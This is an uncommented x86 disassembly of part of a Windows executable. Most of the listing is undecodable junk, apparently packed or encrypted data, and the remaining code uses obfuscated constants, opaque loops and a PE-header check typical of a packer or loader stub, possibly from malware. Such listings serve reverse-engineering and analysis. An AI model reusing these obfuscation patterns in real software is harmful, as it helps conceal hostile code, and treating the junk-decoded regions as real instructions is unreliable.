  4112e6:	outs   dx,DWORD PTR ds:[esi]
  4112e7:	je     0x4115eb
  4112ed:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x2668f61e,eax
  411318:	dec    esp
  411319:	and    BYTE PTR [eax+0x7e7e4549],ah
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x4112a7
  411324:	or     DWORD PTR ds:0xe2f70fbf,edi
  41132a:	xor    edi,DWORD PTR [ebx]
  41132c:	nop    DWORD PTR [ebx-0x40]
  411330:	iret   
  411331:	int3   
  411332:	xchg   edi,eax
  411333:	push   eax
  411334:	jo     0x411361
  411336:	xchg   esp,eax
  411337:	add    ebp,DWORD PTR [ecx]
  411339:	shl    BYTE PTR [eax+0x48],1
  41133c:	shl    DWORD PTR [ebx-0x60],0xe9
  411340:	ror    BYTE PTR [edi+0x17ed533d],1
  411346:	int3   
  411347:	fcmove st,st(0)
  411349:	sbb    dl,0x1e
  41134c:	test   DWORD PTR [ecx+0x37],edi
  41134f:	pop    ss
  411350:	sti    
  411351:	stos   BYTE PTR es:[edi],al
  411352:	inc    edi
  411353:	call   DWORD PTR [esi]
  411355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411356:	(bad)  
  411357:	popf   
  411358:	out    0xb3,al
  41135a:	ficomp WORD PTR ds:0x11dd8163
  411360:	mov    ah,0xce
  411362:	ins    BYTE PTR es:[edi],dx
  411363:	call   0xbd4a:0x99e957bb
  41136a:	jae    0x41133b
  41136c:	(bad)  
  41136d:	ret    
  41136e:	dec    ecx
  41136f:	mov    ecx,0x91244d0b
  411374:	pop    edx
  411375:	xchg   ecx,eax
  411376:	adc    al,0x57
  411378:	mov    bl,0x53
  41137a:	push   edx
  41137b:	loop   0x4113be
  41137d:	sbb    al,0xfb
  41137f:	fild   QWORD PTR [edx]
  411381:	mov    eax,ds:0x303df43b
  411386:	jb     0x411346
  411388:	rcl    DWORD PTR [eax],cl
  41138a:	shl    DWORD PTR [ebx],cl
  41138c:	mov    ds:0x9a99752f,al
  411391:	loop   0x4113fa
  411393:	jle    0x4113bb
  411395:	mov    cl,0x99
  411397:	rol    BYTE PTR ds:[edi-0x6224d961],0xb1
  41139f:	jo     0x411346
  4113a1:	cs or  eax,0xd842786e
  4113a7:	xor    ch,0xef
  4113aa:	mov    al,0x10
  4113ac:	jo     0x411335
  4113ae:	xlat   BYTE PTR ds:[ebx]
  4113af:	jne    0x41133d
  4113b1:	fwait
  4113b2:	mov    cl,0x55
  4113b4:	jg     0x411423
  4113b6:	outs   dx,BYTE PTR ds:[esi]
  4113b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113b9:	clc    
  4113ba:	push   eax
  4113bb:	push   eax
  4113bc:	pop    esi
  4113bd:	es xchg edx,eax
  4113bf:	arpl   di,di
  4113c1:	push   es
  4113c2:	call   0x8e9c758f
  4113c7:	(bad)  
  4113c9:	out    dx,al
  4113ca:	inc    esp
  4113cb:	div    BYTE PTR [eax+0x5fe249e0]
  4113d1:	idiv   BYTE PTR [edi]
  4113d3:	jg     0x411357
  4113d5:	(bad)  
  4113d7:	xor    eax,0x4249ef71
  4113dc:	(bad)  
  4113dd:	paddq  mm1,mm3
  4113e0:	add    al,0x0
  4113e2:	std    
  4113e3:	jne    0x411376
  4113e5:	mov    bl,0xd1
  4113e7:	mov    BYTE PTR [esi],al
  4113e9:	push   esp
  4113ea:	dec    esi
  4113eb:	fwait
  4113ec:	aas    
  4113ed:	clc    
  4113ee:	adc    bl,BYTE PTR [ecx+0x7b]
  4113f1:	xchg   ebx,eax
  4113f2:	mov    ecx,0xc259a47e
  4113f7:	sub    BYTE PTR [ecx-0x490e38f6],bh
  4113fd:	cdq    
  4113fe:	push   ss
  4113ff:	mov    edx,0xb0c403a2
  411404:	sbb    ebp,DWORD PTR [eax+0x62]
  411407:	test   DWORD PTR [esi-0x1b],eax
  41140a:	fldcw  WORD PTR [esi+0x3f]
  41140d:	or     eax,0x27584b50
  411412:	fsub   DWORD PTR [ebx]
  411414:	outs   dx,DWORD PTR ds:[esi]
  411415:	inc    edi
  411416:	and    eax,0xfb1b4f7f
  41141b:	and    cl,BYTE PTR [esp+edx*8+0x6c6de4a3]
  411422:	push   esi
  411423:	jae    0x41146a
  411425:	push   ds
  411426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411427:	jmp    0xdb23:0x663ba788
  41142e:	add    BYTE PTR [eax-0x36f65408],cl
  411434:	pop    es
  411435:	jae    0x4113ca
  411437:	fist   DWORD PTR [eax+0x9]
  41143a:	inc    ecx
  41143b:	lea    edx,[edx]
  41143d:	sub    al,0xf
  41143f:	(bad)  
  411440:	ds jns 0x41148f
  411443:	dec    eax
  411444:	jg     0x411439
  411446:	(bad)  
  411448:	call   0x1d2a:0xf6874ed7
  41144f:	mov    ecx,0x559e1e18
  411454:	jo     0x4113e9
  411456:	mov    BYTE PTR [edx-0x386accc2],bh
  41145c:	pop    ds
  41145d:	pop    esp
  41145e:	pop    edi
  41145f:	sbb    eax,0x8b601b00
  411464:	mov    esp,0x5ebea172
  411469:	enter  0x8bd,0x37
  41146d:	in     al,0xcd
  41146f:	mov    ds:0x21b88acd,al
  411474:	repz mov WORD PTR [ebx+esi*1+0x28bbe6e3],es
  41147c:	clc    
  41147d:	adc    eax,0xd998cd1f
  411482:	jnp    0x41149f
  411484:	out    dx,eax
  411485:	push   ss
  411486:	xor    eax,0x6643c783
  41148b:	lahf   
  41148c:	cmp    DWORD PTR [ecx],edi
  41148e:	pop    ss
  41148f:	(bad)  
  411490:	sub    cl,dh
  411492:	sti    
  411493:	je     0x411502
  411495:	test   DWORD PTR [edi+esi*2+0xef73e26],ebp
  41149c:	fwait
  41149d:	add    ecx,ebp
  41149f:	jno    0x4114eb
  4114a1:	aad    0xcc
  4114a3:	or     esp,esp
  4114a5:	sbb    edx,edi
  4114a7:	cmp    DWORD PTR [esi-0x3ada99e1],esp
  4114ad:	fisttp DWORD PTR [edi-0x67]
  4114b0:	in     eax,dx
  4114b1:	and    DWORD PTR [eax-0x3337aa9f],0x233c94f0
  4114bb:	inc    esp
  4114bc:	int3   
  4114bd:	call   0x430d69d3
  4114c2:	and    edi,ecx
  4114c4:	in     al,0xa
  4114c6:	ss inc edi
  4114c8:	(bad)  
  4114c9:	mov    bl,0x1
  4114cb:	cs dec esi
  4114cd:	xor    esi,DWORD PTR [edi]
  4114cf:	scas   al,BYTE PTR es:[edi]
  4114d0:	mov    ah,0x90
  4114d2:	jno    0x4114ca
  4114d4:	or     dl,ah
  4114d6:	cmp    BYTE PTR [ecx],cl
  4114d8:	and    BYTE PTR [edi+0x63],dl
  4114db:	in     al,dx
  4114dc:	push   0x76
  4114de:	xchg   esp,eax
  4114df:	pop    esi
  4114e0:	pop    ecx
  4114e1:	test   BYTE PTR [ecx],bl
  4114e3:	dec    edx
  4114e4:	mov    eax,ds:0xc229f126
  4114e9:	daa    
  4114ea:	out    dx,eax
  4114eb:	sub    ah,BYTE PTR [ebx+ebx*8+0x7b5c3a0f]
  4114f2:	pushf  
  4114f3:	xchg   edx,eax
  4114f4:	or     al,BYTE PTR [ebp-0x1bdada77]
  4114fa:	and    BYTE PTR [ebx-0x697bb590],bh
  411500:	call   0x27f2:0xcac56c5
  411507:	dec    edi
  411508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411509:	cli    
  41150a:	mov    eax,DWORD PTR ds:0xc56a434c
  411510:	jg     0x4114fc
  411512:	pop    ebp
  411513:	(bad)  
  411514:	pop    ebx
  411515:	cmc    
  411516:	stos   BYTE PTR es:[edi],al
  411517:	clc    
  411518:	jle    0x411581
  41151a:	dec    esp
  41151b:	mov    eax,0xd74ffe5a
  411520:	add    DWORD PTR [eax+0x55],eax
  411523:	daa    
  411524:	aas    
  411525:	xchg   edi,eax
  411526:	loopne 0x41156f
  411528:	jg     0x411531
  41152a:	das    
  41152b:	sti    
  41152c:	pop    ecx
  41152d:	inc    ebp
  41152e:	sub    BYTE PTR [ecx],0xa4
  411531:	mov    cl,0xbd
  411533:	es inc eax
  411535:	or     esp,DWORD PTR [eax+edx*1-0x305b5369]
  41153c:	dec    esp
  41153d:	mov    ds:0xac5ab8e2,eax
  411542:	cmc    
  411543:	in     eax,dx
  411544:	hlt    
  411545:	outs   dx,DWORD PTR ds:[esi]
  411546:	dec    edi
  411547:	aas    
  411548:	sbb    dl,BYTE PTR [edx-0x45]
  41154b:	pop    eax
  41154c:	jns    0x411505
  41154e:	lods   al,BYTE PTR ds:[esi]
  41154f:	or     BYTE PTR [edx],dh
  411551:	(bad)  [esi-0x274bc38f]
  411557:	mov    edx,esp
  411559:	fbld   TBYTE PTR [esp+eax*2+0x2a1ec6a8]
  411560:	fsub   QWORD PTR [ecx-0x34]
  411563:	xor    BYTE PTR [esi+0x4b247eab],bl
  411569:	xor    bh,BYTE PTR [ebx+eiz*2-0x79b9b568]
  411570:	rcr    DWORD PTR [ebx-0x2a],cl
  411573:	push   ebp
  411574:	sbb    BYTE PTR [edi-0x22],ch
  411577:	enter  0x6caf,0x1c
  41157b:	jp     0x411535
  41157d:	ins    BYTE PTR es:[edi],dx
  41157e:	sbb    eax,0x9c5fe606
  411583:	arpl   WORD PTR [ecx+eax*1+0x10],di
  411587:	sub    ecx,DWORD PTR [ecx+0x2a]
  41158a:	sub    al,0x23
  41158c:	inc    esp
  41158d:	(bad)  
  41158e:	int    0x1c
  411590:	int    0x56
  411592:	(bad)  
  411593:	ds dec ebp
  411595:	xchg   ebp,eax
  411596:	lds    ebx,FWORD PTR ds:0xff38f8fb
  41159c:	std    
  41159d:	inc    ecx
  41159e:	sbb    eax,eax
  4115a0:	daa    
  4115a1:	push   ds
  4115a2:	mov    edx,0x72864b5b
  4115a7:	xchg   edi,eax
  4115a8:	pop    ebx
  4115a9:	out    0x3c,al
  4115ab:	test   eax,0xb0d98da2
  4115b0:	xchg   edi,eax
  4115b1:	imul   esi,ebp,0xffffffc5
  4115b4:	dec    ecx
  4115b5:	push   ebp
  4115b6:	enter  0xd8fa,0x98
  4115ba:	std    
  4115bb:	into   
  4115bc:	xor    al,0xfc
  4115be:	mov    eax,DWORD PTR [eax]
  4115c0:	jp     0x411568
  4115c2:	pop    es
  4115c3:	mov    cl,0x93
  4115c5:	pop    edi
  4115c6:	sar    DWORD PTR [esi-0x278b2794],0xfa
  4115cd:	pop    ss
  4115ce:	lds    edi,FWORD PTR [edx+0x7f581f2]
  4115d4:	mov    edx,DWORD PTR [ebp+0x8]
  4115d7:	xor    eax,ecx
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	mov    ch,0xd3
  41161a:	outs   dx,BYTE PTR ds:[esi]
  41161b:	xor    eax,DWORD PTR [esi-0x5b8181c0]
  411621:	jg     0x4116a1
  411623:	jle    0x41163b
  411625:	ja     0x4115b7
  411627:	stos   DWORD PTR es:[edi],eax
  411628:	jno    0x4115ce
  41162a:	jl     0x4116ab
  41162c:	dec    edx
  41162d:	mov    cl,0xbb
  41162f:	(bad)  
  411630:	dec    ebx
  411631:	out    0x56,al
  411633:	sub    DWORD PTR [edx-0x2f],ebp
  411636:	mov    cl,0x5
  411638:	aaa    
  411639:	or     bl,BYTE PTR [eax+0x65]
  41163c:	arpl   WORD PTR [ecx+0x4b],bx
  41163f:	mov    ah,0x68
  411641:	test   BYTE PTR [esi+0x40],0xc5
  411645:	xchg   ebp,eax
  411646:	shr    DWORD PTR [edi],cl
  411648:	xor    al,0xf5
  41164a:	mov    ah,0x79
  41164c:	fidivr WORD PTR [ecx-0x110a4a8f]
  411652:	mov    bh,0x6b
  411654:	outs   dx,DWORD PTR ds:[esi]
  411655:	adc    edx,ecx
  411657:	dec    ecx
  411658:	inc    ecx
  411659:	pop    es
  41165a:	or     DWORD PTR [bp+si],esi
  41165d:	inc    ecx
  41165e:	pop    ebp
  41165f:	scas   eax,DWORD PTR es:[edi]
  411660:	es dec ecx
  411662:	sbb    ebp,edx
  411664:	adc    eax,0x39714af4
  411669:	dec    ecx
  41166a:	loope  0x411605
  41166c:	cmp    BYTE PTR [ebp+0x419c4a3d],dl
  411672:	addr16 aad 0x93
  411675:	jbe    0x41165d
  411677:	xlat   BYTE PTR ds:[ebx]
  411678:	jp     0x41162f
  41167a:	pop    es
  41167b:	and    esp,DWORD PTR [esi]
  41167d:	repz xor eax,0x6403bdd4
  411683:	xor    DWORD PTR [esi+0x3c7e05c6],ecx
  411689:	mov    ebp,0xc92c740e
  41168e:	lahf   
  41168f:	push   ds
  411690:	lahf   
  411691:	mov    ds:0xa1de62f9,al
  411696:	stos   DWORD PTR es:[edi],eax
  411697:	mov    WORD PTR [ecx],cs
  411699:	xchg   ebx,eax
  41169a:	xor    edx,DWORD PTR [edi-0x79c3a3b2]
  4116a0:	retf   
  4116a1:	and    eax,0xf296c962
  4116a6:	ror    DWORD PTR [eax+eiz*1-0x2f],0xdd
  4116ab:	adc    bl,0x36
  4116ae:	fwait
  4116af:	push   cs
  4116b0:	add    BYTE PTR [eax+0x17053e2],al
  4116b6:	int3   
  4116b7:	retf   
  4116b8:	retf   
  4116b9:	cdq    
  4116ba:	shl    DWORD PTR [edi+0x7a],cl
  4116bd:	loop   0x411647
  4116bf:	mov    ah,0x91
  4116c1:	push   esi
  4116c2:	cwde   
  4116c3:	std    
  4116c4:	into   
  4116c5:	pop    es
  4116c6:	inc    esp
  4116c7:	push   ecx
  4116c8:	out    0x77,al
  4116ca:	iret   
  4116cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116cc:	mov    ds:0x13b584fd,al
  4116d1:	sub    al,0xbe
  4116d3:	aad    0x74
  4116d5:	xchg   ebx,eax
  4116d6:	lods   eax,DWORD PTR ds:[esi]
  4116d7:	sub    bl,dh
  4116d9:	dec    edi
  4116da:	mov    bl,0xe
  4116dc:	mov    bl,0x72
  4116de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116df:	push   cs
  4116e0:	stos   DWORD PTR es:[edi],eax
  4116e1:	into   
  4116e2:	scas   eax,DWORD PTR es:[edi]
  4116e3:	or     DWORD PTR [edi-0x18c8cd71],0xbcb45067
  4116ed:	inc    ebp
  4116ee:	out    0x88,al
  4116f0:	mov    cl,0x7b
  4116f2:	inc    edi
  4116f3:	jnp    0x411773
  4116f5:	cmp    BYTE PTR [eax+eax*2],0x96
  4116f9:	(bad)  
  4116fa:	add    al,0x80
  4116fc:	nop
  4116fd:	sbb    dh,al
  4116ff:	sbb    ebx,esi
  411701:	es pop esi
  411703:	mov    ch,0xbd
  411705:	sub    ah,al
  411707:	hlt    
  411708:	cmp    BYTE PTR [edx+0x16350761],ah
  41170e:	int    0xe8
  411710:	imul   BYTE PTR [eax]
  411712:	and    DWORD PTR [ecx],ecx
  411714:	shl    edi,cl
  411716:	mov    ch,0xd6
  411718:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411719:	cmp    esp,DWORD PTR [eax]
  41171b:	xor    dl,ch
  41171d:	cwde   
  41171e:	cmp    dh,BYTE PTR [ebp+0x1f]
  411721:	sbb    DWORD PTR [ecx],edi
  411723:	fsub   QWORD PTR [ebx+0xd74a1cd]
  411729:	mov    edx,0x3769392e
  41172e:	mov    DWORD PTR [ebx-0xa],ebp
  411731:	xchg   al,bh
  411733:	sbb    ebx,edi
  411735:	sub    al,al
  411737:	xchg   ebp,eax
  411738:	pop    ss
  411739:	stos   BYTE PTR es:[edi],al
  41173a:	icebp  
  41173b:	loope  0x4116cb
  41173d:	xchg   ebx,eax
  41173e:	jle    0x4116d2
  411740:	pop    esi
  411741:	jno    0x41174b
  411743:	mov    edi,0x2afaeb6c
  411748:	mov    cl,0x2f
  41174a:	fs ds add al,0x29
  41174e:	stc    
  41174f:	xor    ebx,DWORD PTR [ebp-0x47]
  411752:	arpl   WORD PTR [esi+0x8bbfdc1],ax
  411758:	test   esp,esp
  41175a:	jne    0x41170e
  41175c:	sahf   
  41175d:	rcl    BYTE PTR [ecx+0x5b85e102],1
  411763:	mov    eax,ds:0x2f1f3ed
  411768:	inc    ebx
  411769:	mov    dl,BYTE PTR [ecx]
  41176b:	and    DWORD PTR [ebx+0x7baf60a8],esi
  411771:	jns    0x4117e4
  411773:	push   eax
  411774:	mov    al,0x31
  411776:	pop    edi
  411777:	pop    esp
  411778:	stos   BYTE PTR es:[edi],al
  411779:	daa    
  41177a:	jl     0x4117f3
  41177c:	or     eax,0x29baa368
  411781:	add    DWORD PTR [edi-0x6c1f9342],ecx
  411787:	mov    esi,0x78fef9eb
  41178c:	jge    0x4117d3
  41178e:	je     0x4117f8
  411790:	xchg   ecx,eax
  411791:	sub    eax,0xf4ca5029
  411796:	lds    edi,FWORD PTR [ebx-0x68257f5e]
  41179c:	hlt    
  41179d:	pushf  
  41179e:	pop    ebp
  41179f:	aam    0x88
  4117a1:	iret   
  4117a2:	push   esi
  4117a3:	daa    
  4117a4:	sbb    edx,DWORD PTR [ebp+0x7e]
  4117a7:	leave  
  4117a8:	das    
  4117a9:	mov    BYTE PTR [edx+0x7323d9fa],al
  4117af:	xchg   esp,eax
  4117b0:	dec    edi
  4117b1:	pop    ebp
  4117b2:	dec    edx
  4117b3:	sbb    al,0x3
  4117b5:	in     al,dx
  4117b6:	mov    ebp,0x9730de4c
  4117bb:	jae    0x411747
  4117bd:	mov    eax,0x26128822
  4117c2:	je     0x411745
  4117c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117c5:	mov    ecx,0x3677de29
  4117ca:	stos   BYTE PTR es:[edi],al
  4117cb:	pop    esi
  4117cc:	push   esp
  4117cd:	arpl   WORD PTR [ebx+0x5c70845],cx
  4117d3:	mov    ds:0x3d004337,eax
  4117d8:	inc    edx
  4117d9:	add    BYTE PTR [eax],al
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x4336ff,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43379f,0x433703
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43379f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43371b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4337ab,0x0
  41182f:	mov    eax,ds:0x4337ab
  411834:	inc    eax
  411835:	mov    ds:0x4337ab,eax
  41183a:	cmp    DWORD PTR ds:0x4337ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4338bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4337ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4337ab
  411899:	inc    eax
  41189a:	mov    ds:0x4337ab,eax
  41189f:	cmp    DWORD PTR ds:0x4337ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	repnz adc bl,BYTE PTR [ebp-0x7d]
  4118eb:	sub    al,0x4e
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x411941
  4118f4:	imul   ecx,edx,0xffffffe2
  4118f7:	cdq    
  4118f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f9:	enter  0x1e97,0x42
  4118fd:	xchg   edi,eax
  4118fe:	es dec ebx
  411900:	dec    ecx
  411901:	pop    esp
  411902:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411903:	lahf   
  411904:	xor    bl,BYTE PTR [ebp+0x6]
  411907:	lods   eax,DWORD PTR ds:[esi]
  411908:	jae    0x41190f
  41190a:	sbb    al,0xa7
  41190c:	mov    ah,0x11
  41190e:	mov    al,al
  411910:	pop    ebp
  411911:	pop    edi
  411912:	push   esi
  411913:	mov    BYTE PTR [ebx-0x45d3ef1a],ah
  411919:	jge    0x411950
  41191b:	jb     0x411930
  41191d:	cmp    eax,0x6056233f
  411922:	or     dh,al
  411924:	mov    al,0xdc
  411926:	pop    eax
  411927:	pushaw 
  411929:	inc    eax
  41192a:	xor    eax,0xb61c0f53
  41192f:	inc    edi
  411930:	or     al,0x3a
  411932:	adc    dh,BYTE PTR [esi-0x1d]
  411935:	jae    0x4118d0
  411937:	xchg   esp,eax
  411938:	sub    BYTE PTR [ecx+0x1],0xd9
  41193c:	(bad)  
  41193d:	jmp    0x2ffb:0x4ca06b4c
  411944:	ret    0x2507
  411947:	jne    0x4118f7
  411949:	pop    ds
  41194a:	daa    
  41194b:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41194d:	shl    edx,cl
  41194f:	jno    0x411963
  411951:	add    BYTE PTR [ebp+0x19b3372d],bh
  411957:	or     DWORD PTR [eax],edx
  411959:	inc    DWORD PTR [edx+0x78a258f4]
  41195f:	adc    BYTE PTR [esi+0x50],ch
  411962:	or     BYTE PTR [esi],bh
  411964:	xchg   edx,eax
  411965:	sbb    bl,BYTE PTR [ecx]
  411967:	sub    ch,al
  411969:	jns    0x41196e
  41196b:	pop    eax
  41196c:	inc    edx
  41196d:	test   al,0x8
  41196f:	mov    esi,0xb032ec29
  411974:	(bad)  
  411976:	inc    eax
  411977:	in     al,0x7c
  411979:	repz sti 
  41197b:	xchg   edx,eax
  41197c:	out    dx,eax
  41197d:	cmp    ebp,ebx
  41197f:	rcl    DWORD PTR [esi],cl
  411981:	ins    DWORD PTR es:[edi],dx
  411982:	rol    ah,cl
  411984:	mov    al,ds:0xc1a28f7a
  411989:	jns    0x411973
  41198b:	je     0x411920
  41198d:	jbe    0x4119d1
  41198f:	(bad)
  411992:	jb     0x411961
  411994:	(bad)  
  411995:	mov    ah,0xb2
  411997:	imul   ebx,ebp,0xfffffff7
  41199a:	pop    esi
  41199b:	mov    ebx,0x9eb583ac
  4119a0:	fwait
  4119a1:	xor    eax,0x6306187e
  4119a6:	fist   DWORD PTR [eax+0xed8dcc0]
  4119ac:	repnz or esp,DWORD PTR [ebx]
  4119af:	xor    DWORD PTR [edx+0x29fc1319],ebx
  4119b5:	aas    
  4119b6:	pop    eax
  4119b7:	stos   DWORD PTR es:[edi],eax
  4119b8:	call   0x5084:0x1470bf4
  4119bf:	mov    al,0xe0
  4119c1:	mov    DWORD PTR [ebx],esi
  4119c3:	push   edi
  4119c4:	dec    edx
  4119c5:	ret    0x7990
  4119c8:	pusha  
  4119c9:	cmp    al,0xe0
  4119cb:	call   FWORD PTR [eax-0x2e]
  4119ce:	out    0xb0,al
  4119d0:	pop    es
  4119d1:	shr    ah,0x8b
  4119d4:	sub    BYTE PTR [ecx-0x45],cl
  4119d7:	stos   DWORD PTR es:[edi],eax
  4119d8:	stos   DWORD PTR es:[edi],eax
  4119d9:	popf   
  4119da:	sub    ecx,DWORD PTR ds:0x9d5b91b8
  4119e0:	adc    BYTE PTR [eax+0x464b526a],ah
  4119e6:	sbb    al,0x9a
  4119e8:	leave  
  4119e9:	popf   
  4119ea:	mov    ds:0x9abe4b2b,eax
  4119ef:	mov    cl,0x2
  4119f1:	lahf   
  4119f2:	ror    DWORD PTR [eax-0x1b],0x4a
  4119f6:	push   DWORD PTR [esp+edx*1-0x76]
  4119fa:	mov    edi,0xc1157529
  4119ff:	push   ss
  411a00:	dec    eax
  411a01:	jae    0x411a47
  411a03:	call   0xa0395a91
  411a08:	xchg   DWORD PTR [ebp+0x41],edx
  411a0b:	fwait
  411a0c:	sub    dh,BYTE PTR [edi-0x7a]
  411a0f:	and    eax,0xe3533661
  411a14:	jp     0x4119c0
  411a16:	pop    eax
  411a17:	push   es
  411a18:	(bad)  
  411a19:	icebp  
  411a1a:	(bad)  
  411a1b:	mov    edx,DWORD PTR [edx+0xe]
  411a1e:	push   ebp
  411a1f:	icebp  
  411a20:	inc    esi
  411a21:	jecxz  0x411a9d
  411a23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a24:	adc    al,0xc1
  411a26:	add    eax,0x98c45384
  411a2b:	ror    BYTE PTR [edx+0x38],0x38
  411a2f:	out    dx,eax
  411a30:	sub    al,0x5a
  411a32:	sub    al,0xa0
  411a34:	push   cs
  411a35:	clc    
  411a36:	daa    
  411a37:	scas   al,BYTE PTR es:[edi]
  411a38:	add    BYTE PTR [edi-0x66],0xc5
  411a3c:	cmp    BYTE PTR [esi],dh
  411a3e:	popf   
  411a3f:	popa   
  411a40:	loop   0x411a7e
  411a42:	fbstp  TBYTE PTR [edi+0x3ebfafd7]
  411a48:	mov    esp,0x504e403b
  411a4d:	add    DWORD PTR [edi+edi*1],eax
  411a50:	inc    esp
  411a51:	sub    al,0xdf
  411a53:	jmp    0x7114:0x98801bc2
  411a5a:	stc    
  411a5b:	sar    BYTE PTR [ecx+esi*2-0x2af0f1a1],cl
  411a62:	mov    al,ds:0xd04ed130
  411a67:	lods   eax,DWORD PTR ds:[esi]
  411a68:	cmp    cl,0x25
  411a6b:	mov    DWORD PTR ds:0x1c3f7d1e,edx
  411a71:	loopne 0x411a1f
  411a73:	jno    0x411a70
  411a75:	std    
  411a76:	call   0x6204:0xc0fbedf1
  411a7d:	nop
  411a7e:	and    DWORD PTR [edi-0x77],edx
  411a81:	sub    esp,DWORD PTR [ebx]
  411a83:	pop    edx
  411a84:	outs   dx,BYTE PTR ds:[esi]
  411a85:	cwde   
  411a86:	cmp    BYTE PTR [edi+0x5e8f2bb3],dl
  411a8c:	les    ebx,FWORD PTR [ebp+0x51]
  411a8f:	sub    ecx,DWORD PTR [eax-0x2a125e09]
  411a95:	scas   al,BYTE PTR es:[edi]
  411a96:	je     0x411a64
  411a98:	mov    ah,0x8d
  411a9a:	xor    ecx,edx
  411a9c:	repz add eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
